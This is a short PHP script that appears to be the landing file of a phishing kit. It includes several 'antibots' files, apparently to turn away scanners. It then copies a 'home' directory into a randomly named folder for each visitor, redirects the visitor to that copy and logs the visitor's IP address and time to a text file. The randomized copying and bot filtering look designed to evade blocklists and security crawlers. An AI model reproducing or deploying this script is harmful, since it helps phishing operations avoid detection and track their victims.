<?php
error_reporting(0);
include "./bot/antibots1.php";
include "./bot/antibots2.php";
include "./bot/antibots3.php";
include "./bot/antibots4.php";
include "./bot/antibots5.php";
include "./bot/antibots6.php";
$random=rand(0,9000000);
$md5=md5($random);
$base=base64_encode($md5);
$dst1=md5($base) . $base;
$dst2 = substr(md5($dst1) , -9);
$dst  = strtolower($dst2 );
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="home";
recurse_copy( $src, $dst );
header("location:$dst");
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>

